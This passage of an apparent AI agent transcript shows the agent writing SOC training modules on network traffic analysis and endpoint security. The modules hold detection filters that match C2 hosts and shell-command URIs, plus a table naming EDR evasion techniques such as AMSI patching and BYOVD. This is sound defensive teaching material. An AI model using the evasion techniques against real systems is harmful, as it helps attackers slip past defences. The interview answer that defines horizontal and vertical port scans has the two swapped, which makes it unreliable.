- one source, many dest IPs, same port)\nFlows\n| where Protocol == \"TCP\" and TCPFlags == \"SYN\"\n| summarize TargetIps=dcount(DestinationIp), PortList=make_set(DestinationPort)\n  by SourceIp, bin(TimeGenerated, 5m)\n| where TargetIps > 30 and array_length(PortList) <= 3\n\n// UDP Scan\nFlows\n| where Protocol == \"UDP\"\n| where ICMPType == 3 and ICMPCode == 3  // Port Unreachable\n| summarize ScannedPorts=dcount(DestinationPort) by SourceIp, bin(TimeGenerated, 5m)\n| where ScannedPorts > 50\n```\n\n---\n\n## 12.6 PCAP Analysis — Wireshark/tcpdump Essentials\n\n### tcpdump Filters (Memorize)\n```bash\n# Capture to file\ntcpdump -i eth0 -w capture.pcap -s 0\n\n# Read with filters\ntcpdump -r capture.pcap \"host 10.10.20.5\"\ntcpdump -r capture.pcap \"net 192.168.1.0/24\"\ntcpdump -r capture.pcap \"port 443\"\ntcpdump -r capture.pcap \"tcp port 80 or tcp port 443\"\ntcpdump -r capture.pcap \"tcp[tcpflags] & (tcp-syn|tcp-ack) != 0\"\ntcpdump -r capture.pcap \"tcp[13] == 2\"  # SYN only\ntcpdump -r capture.pcap \"tcp[13] == 18\" # SYN-ACK\ntcpdump -r capture.pcap \"tcp[13] == 4\"  # RST\n\n# HTTP\ntcpdump -r capture.pcap -A \"tcp port 80 and (tcp[((tcp[12]>>2)*4)]=0x47455420 or tcp[((tcp[12]>>2)*4)]=0x504f5354)\"\n\n# DNS\ntcpdump -r capture.pcap \"udp port 53\"\n\n# Large packets\ntcpdump -r capture.pcap \"len > 1500\"\n```\n\n### Wireshark Display Filters (Memorize)\n```wireshark\n# IP/Host\nip.addr == 10.10.20.5\nip.src == 10.10.20.5\nip.dst == 192.168.1.10\n\n# Port/Protocol\ntcp.port == 443\nudp.port == 53\nhttp\ndns\ntls\nsmb2\nkerberos\n\n# TCP Flags\ntcp.flags.syn == 1\ntcp.flags.reset == 1\ntcp.flags.fin == 1\ntcp.flags.syn == 1 and tcp.flags.ack == 0  # SYN only\n\n# HTTP\nhttp.request.method == \"POST\"\nhttp.request.uri contains \"cmd\"\nhttp.user_agent contains \"python\"\nhttp.response.code == 401\n\n# TLS\ntls.handshake.type == 1  # ClientHello\ntls.handshake.extensions_server_name contains \"evil.com\"\ntls.ja3 == \"ae4edc6faf64d08308082ad26be60767\"\n\n# DNS\ndns.qry.name contains \"tunnel\"\ndns.qry.type == 16  # TXT\ndns.flags.rcode == 3  # NXDOMAIN\n\n# Size/Anomalies\nframe.len > 1500\ntcp.len > 1460\ntcp.analysis.retransmission\ntcp.analysis.duplicate_ack\ntcp.analysis.out_of_order\n```\n\n### Wireshark Analysis Workflow\n```\n1. LOAD PCAP\n2. STATISTICS → Conversations → Sort by Bytes (find top talkers)\n3. STATISTICS → Endpoints → Identify internal/external\n4. STATISTICS → Protocol Hierarchy → See protocol distribution\n5. STATISTICS → Flow Graph → Visualize TCP sessions\n6. APPLY FILTERS → Focus on suspicious:\n   - External connections from internal\n   - Long-duration flows\n   - High-volume flows\n   - Failed connections (RST, ICMP unreachable)\n   - Non-standard ports\n7. FOLLOW TCP STREAM → Reconstruct HTTP, SMTP, etc.\n8. EXPORT OBJECTS → HTTP, SMB, DICOM, etc. (files, credentials)\n9. EXPERT INFO → Errors, warnings, notes (retransmissions, malformed)\n```\n\n---\n\n## 12.7 Zeek (Bro) — Structured Network Logs\n\n### Key Log Files for SOC\n| Log | Description | Key Fields |\n|-----|-------------|------------|\n| **conn.log** | **All connections** | uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p, proto, service, duration, orig_bytes, resp_bytes, conn_state, local_orig, missed_bytes, history, orig_pkts, resp_pkts, tunnel_parents |\n| **http.log** | HTTP requests/responses | uid, method, host, uri, referrer, user_agent, request_body_len, response_body_len, status_code, status_msg, mime_type, tags, username, password, proxied, orig_fuids, orig_mime_types, resp_fuids, resp_mime_types |\n| **dns.log** | DNS queries/responses | uid, query, qclass, qtype, rcode, AA, TC, RD, RA, Z, answers, TTLs, rejected |\n| **ssl.log** | TLS handshakes | uid, version, cipher, curve, server_name, resumed, established, cert_chain_fuids, client_cert_chain_fuids, subject, issuer, not_valid_before, not_valid_after, ja3, ja3s |\n| **files.log** | Extracted files | fid, source, depth, analyzers, mime_type, filename, duration, local_orig, is_orig, seen_bytes, total_bytes, missing_bytes, overflow_bytes, timedout, parent_fuid, md5, sha1, sha256, extracted |\n| **x509.log** | Certificate details | certificate.version, certificate.serial, certificate.subject, certificate.issuer, certificate.not_valid_before, certificate.not_valid_after, certificate.key_alg, certificate.sig_alg, certificate.key_type, certificate.key_length, certificate.exponent, certificate.curve, certificate.san, certificate.extensions |\n\n### Zeek Query Examples\n```zeek\n# conn.log: Beaconing candidates\ncat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto duration orig_bytes resp_bytes | \nawk '$6 > 100 && $7 < 1000 && $4 == \"tcp\"'\n\n# http.log: Suspicious POST\ncat http.log | zeek-cut uid id.orig_h method host uri status_code user_agent | \nawk '$3 == \"POST\" && $5 ~ /cmd|exec|shell/'\n\n# ssl.log: Weak cipher / old TLS\ncat ssl.log | zeek-cut uid id.orig_h id.resp_h version cipher server_name ja3 | \nawk '$4 ~ /TLSv1[01]/ || $5 ~ /RC4|DES|3DES|MD5|SHA1$/'\n\n# dns.log: Tunneling\ncat dns.log | zeek-cut uid id.orig_h query qtype rcode answers | \nawk '$4 == \"TXT\" || $5 == \"NXDOMAIN\"'\n```\n\n---\n\n## 12.8 Threat Hunting with Network Data\n\n### Hunt Hypotheses\n| Hypothesis | Data Source | Query Pattern |\n|------------|-------------|---------------|\n| **C2 via HTTPS** | Proxy, Zeek ssl/conn | JA3 clustering, SNI anomalies, cert anomalies |\n| **C2 via DNS** | DNS logs, Zeek dns | High entropy, NXDOMAIN rate, TXT volume |\n| **Lateral Movement** | Firewall, Zeek conn (SMB/RDP/WinRM) | Internal→Internal, admin ports, off-hours |\n| **Data Exfil** | Proxy, Firewall, NetFlow | Large outbound, cloud storage, rare domains |\n| **Credential Theft** | Kerberos, NTLM, LDAP logs | AS-REQ/4768 anomalies, 4776 spikes, LDAP binds |\n| **Malware Delivery** | Proxy, Email, Zeek http/files | Drive-by, malicious attachments, exploit kits |\n| **Insider Threat** | DLP, Proxy, File logs | Large access, off-hours, personal cloud |\n\n---\n\n## 12.9 Interview Questions for This Module\n\n1. **What is a network flow (5-tuple) and how does it differ from a session?**\n   - Flow: Unidirectional 5-tuple (src/dst IP, src/dst port, protocol). Session: Bidirectional pair of flows.\n\n2. **What are the key characteristics of C2 beaconing traffic?**\n   - Regular intervals (low jitter), long duration, consistent small packet sizes, single/few destinations, outbound-initiated.\n\n3. **How do you detect a SYN scan using flow data?**\n   - Many SYN packets to many ports/hosts, few SYN-ACK responses, high SYN:SYN-ACK ratio.\n\n4. **What lateral movement protocols should you monitor internally?**\n   - SMB (445), RDP (3389), WinRM (5985/5986), SSH (22), RPC/DCOM (135+dynamic), LDAP (389/636), Kerberos (88), MSSQL (1433).\n\n5. **What is JA3 and how is it used?**\n   - TLS client fingerprint (MD5 of ClientHello parameters). Identifies tools/malware regardless of User-Agent spoofing.\n\n6. **What Zeek log files are most valuable for SOC and why?**\n   - conn.log (all connections), http.log (web), dns.log (DNS), ssl.log (TLS + JA3), files.log (extracted files), x509.log (certs).\n\n7. **How do you detect data exfiltration to cloud storage via network logs?**\n   - Large outbound transfers to known cloud provider IP ranges (AWS S3, Azure Blob, GCS), unusual for user/host baseline.\n\n8. **What tcpdump filter captures only TCP SYN packets?**\n   - `tcp[13] == 2` or `tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0`\n\n9. **What Wireshark display filter shows HTTP POST requests with \"cmd\" in URI?**\n   - `http.request.method == \"POST\" and http.request.uri contains \"cmd\"`\n\n10. **What is the difference between a horizontal and vertical port scan?**\n    - Horizontal: One source scans many ports on one target. Vertical: One source scans one port across many targets.\n\n---\n\n## 12.10 Study Checklist for Module 12\n\n- [ ] Define flow vs session, list 5-tuple components\n- [ ] Describe beaconing characteristics and detection methods (statistical, FFT, ML)\n- [ ] List lateral movement protocols with ports and flow signatures\n- [ ] Write KQL for: Beaconing, SMB lateral, RDP lateral, Exfiltration, Port scans\n- [ ] Memorize 15+ tcpdump filters and 15+ Wireshark display filters\n- [ ] Explain Zeek log files (conn, http, dns, ssl, files, x509) and key fields\n- [ ] Perform PCAP analysis workflow (Conversations → Endpoints → Protocol Hierarchy → Flow Graph → Filters → Follow Stream → Export Objects → Expert Info)\n- [ ] Formulate 5 hunt hypotheses with data sources and query patterns\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 13 — Endpoint Security*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/12-network-traffic-analysis.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 25.4s)

_Thinking:_

Good, Module 12 is done. Now let me continue with Module 13 - Endpoint Security.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 148.3s)

_Thinking:_

Now let me create Module 13 - Endpoint Security.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 13: Endpoint Security\n\n**Priority: P0 — Endpoint = where attacks execute. L1 lives in EDR console daily.**\n\n---\n\n## 13.1 Endpoint Protection Evolution\n\n| Generation | Technology | Detection | Response |\n|------------|------------|-----------|----------|\n| **1st** | Antivirus (AV) | Signatures (MD5/SHA) | Quarantine file |\n| **2nd** | EPP (Endpoint Protection Platform) | Signatures + Heuristics + Basic Behavioral | Quarantine, clean |\n| **3rd** | NGAV (Next-Gen AV) | ML/Static AI + Behavioral | Quarantine, rollback |\n| **4th** | **EDR (Endpoint Detection & Response)** | **Behavioral + ML + Threat Intel + Hunt** | **Isolate, kill, remediate, hunt** |\n| **5th** | **XDR (Extended Detection & Response)** | **Cross-layer (Endpoint+Network+Cloud+Identity)** | **Unified response** |\n\n### Key Distinction: EPP vs EDR\n| Aspect | EPP (Prevention) | EDR (Detection/Response) |\n|--------|------------------|--------------------------|\n| **Goal** | Block known/unknown malware | Detect, investigate, respond |\n| **Visibility** | File execution, registry | **Full process tree, memory, network, user** |\n| **Data Retention** | Minutes/Hours | **Days/Weeks (queryable history)** |\n| **Investigation** | None/Alert only | **Timeline, root cause, pivot** |\n| **Response** | Automated block/quarantine | **Manual + Automated (SOAR)** |\n| **Threat Hunting** | No | **Yes (query language, MITRE mapping)** |\n\n**Reality**: Modern agents combine EPP + EDR (e.g., CrowdStrike, SentinelOne, Defender for Endpoint, Cortex XDR).\n\n---\n\n## 13.2 EDR Telemetry — What the Agent Sees\n\n### Kernel-Level Collection (via Kernel Driver / Minifilter)\n| Telemetry Type | Examples | Collection Method |\n|----------------|----------|-------------------|\n| **Process** | Create, Exit, OpenProcess, CreateRemoteThread | PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks |\n| **File** | Create, Write, Delete, Rename, Read | Minifilter (IRP_MJ_CREATE, WRITE, SET_INFO) |\n| **Registry** | Key/Value Create, Modify, Delete | CmRegisterCallback |\n| **Network** | Connect, Accept, Send, Receive | WFP (Windows Filtering Platform) Callouts |\n| **Image/DLL Load** | LoadImage, MapViewOfSection | PsSetLoadImageNotifyRoutine |\n| **Thread** | CreateRemoteThread, QueueUserAPC | ObRegisterCallbacks (Thread) |\n| **Memory** | VirtualAlloc, VirtualProtect, WriteProcessMemory | ETW (Event Tracing for Windows) + Kernel callbacks |\n| **Token/Privilege** | AdjustTokenPrivileges, Impersonation | ObRegisterCallbacks (Token) |\n| **Driver Load** | Load/Unload | PsSetLoadImageNotifyRoutine |\n| **WMI** | Event Filter/Consumer Binding | ETW (Microsoft-Windows-WMI-Activity) |\n\n### User-Mode Collection\n| Source | Data |\n|--------|------|\n| **ETW Providers** | PowerShell (Script Block), .NET, WMI, DNS Client, WinINet, HTTP.sys |\n| **AMSI** | Script content (PowerShell, VBScript, JS, .NET assemblies) |\n| **Application Logs** | Custom app logs, browser history, email client |\n| **Command Line** | Via Process Create (kernel) + ETW |\n\n---\n\n## 13.3 Detection Methodologies\n\n### 1. Signature-Based (Static)\n| Type | Description | Evasion |\n|------|-------------|---------|\n| **Hash** | MD5/SHA1/SHA256 of known malware | Polymorphism, packing |\n| **YARA** | Pattern rules (strings, regex, structure) | Obfuscation, encryption |\n| **IOC** | IP, Domain, Hash, Mutex, Registry | Fast rotation, living-off-land |\n\n### 2. Heuristic/Static Analysis (Pre-Execution)\n| Technique | What It Checks |\n|-----------|----------------|\n| **PE Header Analysis** | Imports, sections, entropy, timestamps, certificates |\n| **String Extraction** | URLs, IPs, registry keys, mutexes, commands |\n| **Import Table (IMPHASH)** | Library/function fingerprinting |\n| **Control Flow Graph** | Structural similarity to malware families |\n| **ML Static** | Features → Malicious/Benign probability |\n\n### 3. Behavioral (Runtime) — **EDR Core**\n| Behavior Category | Examples | MITRE |\n|-------------------|----------|-------|\n| **Process Injection** | CreateRemoteThread, QueueUserAPC, SetThreadContext, Process Hollowing, Process Doppelgänging, Herpaderping | T1055 |\n| **Credential Access** | LSASS OpenProcess (VM_READ), Mimikatz,sekurlsa, comsvcs.dll, PSScriptPolicyTest | T1003 |\n| **Persistence** | Run Keys, Services, Scheduled Tasks, WMI, Startup Folder, COM Hijack, DLL Search Order | T1547, T1543, T1053 |\n| **Defense Evasion** | AMSI Bypass, ETW Tampering, Unhooking, Masquerading, Timestomping, Clearing Logs | T1562, T1036, T1070 |\n| **Discovery** | Net view, whoami, systeminfo, AD query, Process enumeration, Network share enumeration | T1082, T1083, T1018 |\n| **Lateral Movement** | PsExec, WMI, SMB Admin$, RDP, WinRM, Pass-the-Hash, Pass-the-Ticket | T1021 |\n| **Collection** | Clipboard, Screen capture, File staging, Archive creation, Email collection | T1056, T1119, T1560 |\n| **Command & Control** | Beaconing, DNS/HTTP/HTTPS C2, Domain fronting, Non-standard ports, Protocol tunneling | T1071 |\n| **Exfiltration** | Large uploads, Cloud storage, Encrypted channels, Scheduled transfers | T1041, T1567 |\n| **Impact** | Ransomware (mass encrypt), Wiper, Data destruction, Service stop, Defacement | T1486, T1485 |\n\n### 4. Machine Learning / AI\n| Approach | Training Data | Output |\n|----------|---------------|--------|\n| **Supervised** | Labeled malicious/benign samples | Probability score |\n| **Unsupervised/Anomaly** | Baseline normal behavior | Outlier score |\n| **Deep Learning** | Raw bytes, sequences, graphs | Family classification, detection |\n| **Graph/Relational** | Process tree, network, file relations | Attack chain detection |\n\n---\n\n## 13.4 EDR Response Capabilities\n\n| Action | Description | Use Case |\n|--------|-------------|----------|\n| **Network Isolation** | Block all except management (EDR cloud) | Contain compromised host |\n| **Process Kill** | Terminate PID, optionally delete binary | Stop active malware/C2 |\n| **File Quarantine** | Move to encrypted vault, replace with placeholder | Preserve evidence, prevent execution |\n| **Registry Rollback** | Revert malicious changes (Run keys, services) | Remove persistence |\n| **Memory Dump** | Capture process/system memory (LSASS, malware) | Forensic analysis |\n| **Script Execution** | Run PowerShell/Bash for remediation | Automated cleanup |\n| **Host Reboot** | Force restart (sometimes needed for driver unload) | Kernel-level malware |\n| **User Logoff** | Force logoff, invalidate tokens | Compromised session |\n| **Block Hash/IP/Domain** | Add to blocklist (local or global) | Prevent re-infection |\n\n---\n\n## 13.5 EDR Architecture — What L1 Sees in Console\n\n### Typical EDR Console Views\n| View | Purpose |\n|------|---------|\n| **Alert Queue** | Triage: Severity, Status, Host, User, MITRE, Timestamp |\n| **Host Timeline** | Process tree, file/reg/net events, MITRE tags, 24h/7d/30d |\n| **Process Details** | Full tree, command lines, hashes, network conns, DLLs, MITRE |\n| **Network Connections** | All outbound/inbound, resolved IPs, process context, JA3 |\n| **File Analysis** | Hash reputation, sandbox verdict, prevalence, PE info |\n| **User Activity** | Logons, file access, admin actions, risk score |\n| **Threat Hunting** | Query language (KQL, XQL, proprietary), MITRE heatmap |\n| **Vulnerability** | Missing patches, CVE mapping, exploitability |\n| **Compliance** | Policy adherence, encryption, firewall status |\n\n### Key Investigation Pivots\n```\nAlert → Host Timeline → Process Tree → Command Line → Network Conns → File Hash → Threat Intel\n                ↓\n           Parent Process → Grandparent → ... → Root Cause\n                ↓\n           Child Processes → Spawned → ... → Impact Scope\n                ↓\n           Network → Destination IP/Domain → Threat Intel → C2 Infrastructure\n                ↓\n           Files → Created/Modified → Hash → Sandbox → Family\n                ↓\n           User → Logons → Groups → Privilege → Lateral Risk\n```\n\n---\n\n## 13.6 Common EDR Alert Types — Triage Guide\n\n| Alert Category | Typical Trigger | L1 Triage Steps |\n|----------------|-----------------|-----------------|\n| **Suspicious Process Tree** | Office → Script, LOLBin, Service → Shell | Check parent, cmdline, network, files, user |\n| **Credential Theft** | LSASS access, Mimikatz, sekurlsa, comsvcs.dll | Source process, user, network, timeline |\n| **Persistence** | Run key, Service, Task, WMI, Startup | Persistence type, creator, payload, survival |\n| **C2/Beaconing** | Regular intervals, known C2 IP, JA3 match | Interval, destination, process, payload |\n| **Lateral Movement** | SMB/Admin$, RDP, WinRM, Pass-the-Hash | Source/dest, auth type, account, scope |\n| **Ransomware** | Mass file encrypt, ransom note, entropy spike | Process, extensions, ransom note, scope |\n| **Exploit** | CVE exploit, buffer overflow, RCE | Vuln CVE, process, payload, patch status |\n| **Living-off-Land** | Certutil, Regsvr32, Rundll32, Mshta, InstallUtil | Binary, args, network, parent |\n| **AMSI/ETW Bypass** | AmsiScanBuffer patch, ETW provider disable | Process, technique, follow-up actions |\n| **Data Staging** | Large archive creation, file copy to temp | Files, destination, process, user |\n\n---\n\n## 13.7 EDR Evasion — What Attackers Do (So You Detect It)\n\n| Technique | Mechanism | Detection |\n|-----------|-----------|-----------|\n| **Unhook/Inline Hook Removal** | Restore original syscall/API bytes | Kernel callback detects modification |\n| **Direct Syscalls** | Bypass user-mode hooks (ntdll) | Syscall monitoring (ETW, kernel) |\n| **Heaven's Gate** | 32-bit → 64-bit transition (WoW64) | Cross-architecture calls |\n| **Process Hollowing** | Create suspended → Replace memory → Resume | Memory writes to remote process, section mapping |\n| **Process Doppelgänging** | TxF transaction → Replace → Commit | Transactional NTFS abuse |\n| **Process Herpaderping** | Write → Map → Create → Modify → Execute | File create + image load mismatch |\n| **Reflective DLL Injection** | Manual LoadLibrary in memory | Memory allocation + RWX, no disk DLL |\n| **Module Stomping** | Overwrite legitimate module in memory | Image load + memory permission changes |\n| **AMSI Bypass** | Patch AmsiScanBuffer / AmsiInitFailed | AMSI event logs, memory scan |\n| **ETW Tampering** | Disable ETW providers (Threat-Intelligence, etc.) | ETW provider state changes |\n| **Living-off-Land (LOLBins)** | Signed Microsoft binaries for malicious use | Process tree + args + network context |\n| **Bring Your Own Vulnerable Driver (BYOVD)** | Load signed vulnerable driver → Kernel exploit | Driver load (unexpected), kernel callbacks |\n\n---\n\n## 13.8 Major EDR Vendors — Capability Comparison\n\n| Vendor | Agent | Query Language | Key Strength |\n|--------|-------|----------------|--------------|\n| **CrowdStrike Falcon** | Lightweight (sensor) | FQL (Falcon Query Language) | Cloud-native, threat intel, managed hunting |\n| **SentinelOne Singularity** | Behavioral AI (Static/Dynamic) | PowerQuery (SQL-like) | Autonomous response, storyline, rollback |\n| **Microsoft Defender for Endpoint** | Built-in (Win10/11/Server) | KQL (Advanced Hunting) | Windows integration, Entra ID, cost |\n| **Palo Alto Cortex XDR** | Cortex XDR Agent | XQL (SQL-like) | Network+Endpoint+Cloud, analytics |\n| **Elastic Defend** | Elastic Agent | KQL/ES|QL | Open, flexible, SIEM integration |\n| **Trend Micro Vision One** | Apex One + Sensors | Custom | XDR suite, email/network/endpoint |\n| **Cybereason** | Behavioral (Malop) | Custom | Attack storyline (Malop), Russian APT focus |\n\n**L1 Reality**: You'll use whatever your org has. Learn the **concepts** (process tree, timeline, pivots), not just one UI.\n\n---\n\n## 13.9 EDR Health & Hygiene — What L1 Monitors\n\n| Metric | Healthy | Action if Unhealthy |\n|--------|---------|---------------------|\n| **Sensor Online %** | > 99% | Investigate offline hosts (reboot, reinstall, network) |\n| **Sensor Version** | Latest - 1 | Push updates, check deployment rings |\n| **Policy Applied** | 100% matched | Drift detection, re-apply |\n| **Event Throughput** | Normal baseline | Check for storm (log4j, ransomware) or drop |\n| **Cloud Connectivity** | Connected | Network/firewall/proxy check |\n| **License Usage** | < 85% | Procure more, reclaim stale |\n| **False Positive Rate** | < 5% (tunable) | Tune rules, create suppressions |\n| **Mean Time to Detect (MTTD)** | < 15 min (P1) | Process improvement |\n| **Mean Time to Respond (MTTR)** | < 1 hr (P1) | Automation, playbooks |\n\n---\n\n## 13.10 Interview Questions for This Module\n\n1. **What is the difference between EPP and EDR?**\n   - EPP: Prevention-focused, signature/heuristic, block/quarantine. EDR: Detection/response-focused, behavioral, full visibility, investigation, hunt, manual+auto response.\n\n2. **What telemetry does an EDR agent collect at kernel level?**\n   - Process create/exit, OpenProcess, CreateRemoteThread, File create/write/delete, Registry key/value changes, Network connect/send, Image/DLL load, Thread creation, Memory allocation/protect, Driver load, Token manipulation.\n\n3. **Name 5 behavioral detection categories with MITRE techniques.**\n   - Process Injection (T1055), Credential Access (T1003), Persistence (T1547/T1053), Defense Evasion (T1562), Discovery (T1082), Lateral Movement (T1021), C2 (T1071), Exfiltration (T1041), Impact (T1486).\n\n4. **What response actions can EDR take?**\n   - Network isolate, process kill, file quarantine, registry rollback, memory dump, script execution, host reboot, user logoff, block hash/IP/domain.\n\n5. **How do you investigate an EDR alert for \"Suspicious Process Tree\"?**\n   - Check parent process, command line, network connections, file modifications, child processes, user context, threat intel on hashes/IPs, MITRE tags.\n\n6. **What is \"Living-off-the-Land\" and how does EDR detect it?**\n   - Using signed system binaries (LOLBins) for malicious purposes. Detection: Process tree context, command line args, network connections, behavioral anomalies (not just binary reputation).\n\n7. **What is Process Hollowing and how does EDR detect it?**\n   - Create suspended process → Replace memory with malicious code → Resume. Detected by: Memory writes to remote process, section mapping, image load mismatch, RWX memory.\n\n8. **What is AMSI and how do attackers bypass it?**\n   - Antimalware Scan Interface scans script content in memory. Bypass: Patch AmsiScanBuffer in memory, set AmsiInitFailed via reflection. Detected via AMSI event logs, memory scans.\n\n9. **What metrics should L1 monitor for EDR health?**\n   - Sensor online %, version compliance, policy applied, event throughput, cloud connectivity, license usage, FP rate, MTTD, MTTR.\n\n10. **How does EDR differ from traditional AV in data retention?**\n    - AV: Minutes/hours (alert only). EDR: Days/weeks of queryable history (process tree, timeline, network, files, registry).\n\n---\n\n## 13.11 Study Checklist for Module 13\n\n- [ ] Explain EPP vs EDR vs NGAV vs XDR evolution\n- [ ] List 10+ kernel telemetry sources\n- [ ] Describe 4 detection methodologies (Signature, Heuristic, Behavioral, ML)\n- [ ] Map 9 behavioral categories to MITRE techniques\n- [ ] List 9 EDR response actions\n- [ ] Walk through EDR console investigation pivots\n- [ ] Triage 5 common alert types (Process Tree, Cred Theft, Persistence, C2, Lateral)\n- [ ] Explain 10 EDR evasion techniques and detection\n- [ ] Compare 